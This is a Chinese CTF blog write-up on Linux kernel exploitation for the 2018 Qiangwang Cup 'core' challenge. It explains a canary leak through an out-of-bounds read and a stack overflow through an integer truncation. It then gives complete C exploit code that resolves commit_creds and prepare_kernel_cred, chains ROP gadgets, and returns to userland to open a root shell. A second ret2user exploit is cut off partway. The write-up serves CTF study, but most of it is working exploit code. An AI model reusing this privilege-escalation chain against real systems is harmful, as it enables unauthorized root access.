<h2 id="kernel-ROP"><a href="#kernel-ROP" class="headerlink" title="kernel-ROP"></a>kernel-ROP</h2><p>例题是 <a target="_blank" rel="noopener" href="https://github.com/cc-sir/ctf-challenge/tree/master/2018%20%E5%BC%BA%E7%BD%91%E6%9D%AFkernel%20pwn-core">2018强网杯 pwn-core</a></p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>发现 <code>ioctl</code> 函数中可以控制 <code>off</code> 这个全局变量（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051126597.png" alt="image-20230405112654518" style="zoom:50%;" />



<p><code>core_read</code> 函数，存在数组索引溢出的漏洞， <code>off</code> 我们可控，且程序没有做任何检查，<code>v5</code> 是在栈中，因此配合 <code>copy_to_user</code> 函数可以泄露栈中的任意数据，这里考虑来泄露 <code>canary</code> 以便后面的 <code>rop</code> 执行。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051128320.png" alt="image-20230405112810250" style="zoom:50%;" />



<p>通过分析 <code>off</code> 为 <code>0x40</code> 的时候<code>&amp;v5[off]</code> 正好指向了 <code>canary</code> 的位置（这里就是 <code>PWN</code> 手的基本技能，所以不再赘述），<code>copy_to_user</code> 会将内核中的数据 <code>copy</code> 到用户空间中，也就是赋值给了 <code>a1</code> 。</p>
<p><code>core_copy_func</code> 函数中存在一个强转的漏洞（如下），将 <code>__int64</code> 类型的 <code>a1</code> ，强转为了 <code>unsigned __int16</code> 类型，如果我们将 <code>a1</code> 设置为 <code>0xffffffffffff0000 | (0xd0)</code> ，就可以在绕过 <code>if(a1 &gt; 63)</code> 检查的情况下执行 <code>qmemcpy</code> 函数完成栈溢出</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081646889.png" alt="image-20230408164606742" style="zoom:50%;" />

<p>不过上面这里只是能控制 <code>a1</code> 这个字节数，想要 <code>ROP</code> 还需要控制 <code>name</code> 数组中的数据。</p>
<p>通过查看 <code>core_write</code> 函数，发现这里可以直接控制 <code>name</code> 数组中的内容，如此任意读和任意写都有了，就可以开始我们的 <code>kernel-ROP</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081718605.png" alt="image-20230408171831543"></p>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081726031.png" alt="image-20230408172611971"></p>
<p>因为程序开了 <code>canary</code> ，所以 <code>ROP</code> 之前需要先进行泄露 <code>canary</code></p>
<h4 id="泄露-canary"><a href="#泄露-canary" class="headerlink" title="泄露 canary"></a>泄露 <code>canary</code></h4><p>所以泄露 <code>canary</code> 的部分 <code>exp</code> 如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">    canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里一定要注意，从内核 <code>copy</code> 过来的数据有 <code>64</code> 个字节，而不是只有 <code>canary</code> ，当时程序就定义了一个 <code>int</code> 类型的变量  <code>canary</code> 传入了地址进行接收，结果直接报错（原因是破坏了用户程序的 <code>canary</code>）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051735283.png" alt="image-20230405173514198"></p>
<h4 id="获取函数的真实地址"><a href="#获取函数的真实地址" class="headerlink" title="获取函数的真实地址"></a>获取函数的真实地址</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>从 <code>/proc/kallsyms</code> 文件中可以获取任意一个函数的真实地址，本题的 <code>init</code> 文件中将 <code>/proc/kallsyms</code> 文件 <code>copy</code> 了一份叫做 <code>/tmp/kallsyms</code> ，读取该文件，即可得到函数的真实地址，但如果想获取 <code>vmlinux</code> 中的基地址，我们还需要拿到函数在 <code>vmlinux</code> 中的偏移。</p>
<h5 id="获取vmlinux中的函数偏移"><a href="#获取vmlinux中的函数偏移" class="headerlink" title="获取vmlinux中的函数偏移"></a>获取vmlinux中的函数偏移</h5><p>因为开了 <code>KASLR</code> ，所以函数的真实地址需要获取基地址和函数偏移才行。</p>
<p>使用 <code>readelf -s vmlinux | grep vuln</code> 获取其地址（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051802154.png" alt="image-20230405180248088"></p>
<p>然后再用 <code>checksec</code> 命令来获取基地址（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051804686.png" alt="image-20230405180406627"></p>
<p>得到 <code>prepare_kernel_cred</code> 的偏移为 <code>0x9cce0</code>  , <code>commit_creds</code> 函数的偏移为 <code>0x9c8e0</code> </p>
<p>把这些偏移写回到上面的脚本即可，之所以要拿到 <code>vmlinux</code> 的基地址是因为后续的 <code>gadget</code> 偏移需要加上基地址才能得到 <code>gadget</code> 的真实地址。</p>
<h4 id="获取-gadget"><a href="#获取-gadget" class="headerlink" title="获取 gadget"></a>获取 <code>gadget</code></h4><p>如下方法查看 <code>gadget</code> 会比较方便</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary vmlinux &gt; ropgadget</span><br><span class="line">grep &#x27;: pop rdi ; ret&#x27; ropgadget </span><br></pre></td></tr></table></figure>

<p>或者用 <code>vscode</code> 打开 <code>ropgadget</code> 文件， <code>ctrl+f</code> 来搜索也可以</p>
<p>找到的 <code>gadget</code> 需要先减去 <code>vmlinux</code> 的基地址得到 <code>gadget</code> 的偏移</p>
<p>最后在 <code>exp</code> 中，一个 <code>gadget</code> 的真实地址应该是 <code>vmlinux_base</code> 加上其偏移</p>
<h4 id="ROP-链的布置"><a href="#ROP-链的布置" class="headerlink" title="ROP 链的布置"></a><code>ROP</code> 链的布置</h4><p>我们最后希望用 <code>ROP</code> 来执行 <code>commit_creds(prepare_kernel_cred(0))</code> ，<code>prepare_kernel_cred(0)</code> 会返回一个 <code>root</code> 权限的 <code>cred</code> 结构体指针，而 <code>commit_creds</code> 函数可以将该结构体指针作用于当前进程，接着我们返回用户态，去执行一个 <code>system(&quot;/bin/sh&quot;)</code> 便可以稳定的以 <code>root</code> 权限执行命令了。</p>
<p>正常情况下，我们需要用 <code>pop rdi ; ret</code> 这个 <code>gadget</code> 来控制 <code>prepare_kernel_cred</code> 函数的参数，我们也可以成功搜到这个 <code>gadget</code> ，但问题在于没有 <code>mov rdi,rax ; ret</code> 这个 <code>gadget</code> 来传递给 <code>commit_creds</code> 函数参数，通过搜索发现具有一个 <code>mov rdi, rax ; jmp rdx</code> 这个 <code>gadget</code> ，并且存在 <code>pop rdx ; ret</code> 来控制 <code>rdx</code> ，因此 <code>rop</code> 链的布置如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   rop[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++]=canary;</span><br><span class="line">rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">rop[i++]=commit_creds;</span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br></pre></td></tr></table></figure>



<p>此时 <code>commit_creds(prepare_kernel_cred(0))</code> 执行完毕，但需要来稳固程序，因为在内核态栈溢出后，栈中的一些数据被损坏，其中包括了用户态的状态信息，一旦损失了这些信息，重新切换到用户态时系统就会崩溃。所以我们要在攻击之前先保存一下状态信息，将其构造在内核栈中，最后返回的时候就是正常的。</p>
<p>系统权限分为内核态和用户态，分离的实现是 <code>swapgs</code> 指令，该指令将 <code>gs</code> 寄存器的值与 <code>IA32_KERNEL_GS_BASE MSR</code> 地址中的值交换。内核态常规操作（如系统调用）的入口处，执行 <code>swapgs</code> 指令获得指向内核数据结构的指针，那么对应的， 从内核态退出，返回到用户态时也需执行一下 <code>swapgs</code> </p>
<p><code>iretq</code> 指令用来恢复用户空间，它会从栈中弹出已经保存的 <code>RIP</code> <code>CS</code> <code>RFLAGS</code> <code>RSP</code> <code>SS</code> 恢复之前的执行环境，所以最后执行 <code>iretq</code> 指令，恢复最开始保存的寄存器值即可。</p>
<p>所以 <code>ROP</code> 链的部分为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   rop[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++]=canary;</span><br><span class="line">rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">rop[i++]=commit_creds;</span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">rop[i++] = user_ss;<span class="comment">//SS</span></span><br></pre></td></tr></table></figure>



<p>下面两张图片是 <code>iretq</code> 指令执行前后的情况，可以看到已经从内核态切换到了用户态（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840059.png" alt="image-20230408183923247"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840996.png" alt="image-20230408183934789"></p>
<p>因为 <code>RIP</code> 设置的是用户态中 <code>system(&quot;/bin/sh&quot;)</code> 的地址，因此开启了新的 <code>root shell</code> （如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081843627.png" alt="image-20230408184359505"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_rflags,user_ss,user_cs,user_sp;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">		<span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">		<span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">		<span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">		:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> 		:</span><br><span class="line"> 		: <span class="string">&quot;memory&quot;</span></span><br><span class="line"> 	);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] get shell successfully!&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">   <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">   save_stats();</span><br><span class="line">   <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line"></span><br><span class="line">   ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">   canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">   find_symbols();</span><br><span class="line"></span><br><span class="line">   <span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">      rop[i]=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   rop[i++]=canary;</span><br><span class="line">   rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">   rop[i++]=commit_creds;</span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br><span class="line">   </span><br><span class="line">   rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">   rop[i++]=<span class="number">0</span>;</span><br><span class="line">   rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">   rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">   rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">   rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">   rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">   rop[i++] = user_ss;<span class="comment">//SS</span></span><br><span class="line"></span><br><span class="line">   write(fd,rop,<span class="number">0x400</span>);</span><br><span class="line">   ioctl(fd,<span class="number">0x6677889A</span>,<span class="number">0xffffffffffff0000</span> | (<span class="number">0xd0</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h2><p><code>ret2user</code> 和上面的 <code>ROP</code> 非常相似（毕竟本质上还是 <code>ROP</code> ），给我的感觉是 <code>ret2user</code> 在控制参数方面有很大的优势，它是将执行流返回到了用户态中布置的函数上，虽然执行的函数是位于内核空间，但因为我们的权限是 <code>ring 0</code>，因此依然可以正常运行。其根本原因是因为内核空间可以访问用户空间的进程（反之则不行），以内核的权限执行用户空间的代码完成提权（前提是没有开启 <code>SMEP</code> 保护）</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_rflags,user_ss,user_cs,user_sp;</span><br><span class="line"> <span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">		<span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">		<span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">		<span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">		<span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">		:<span 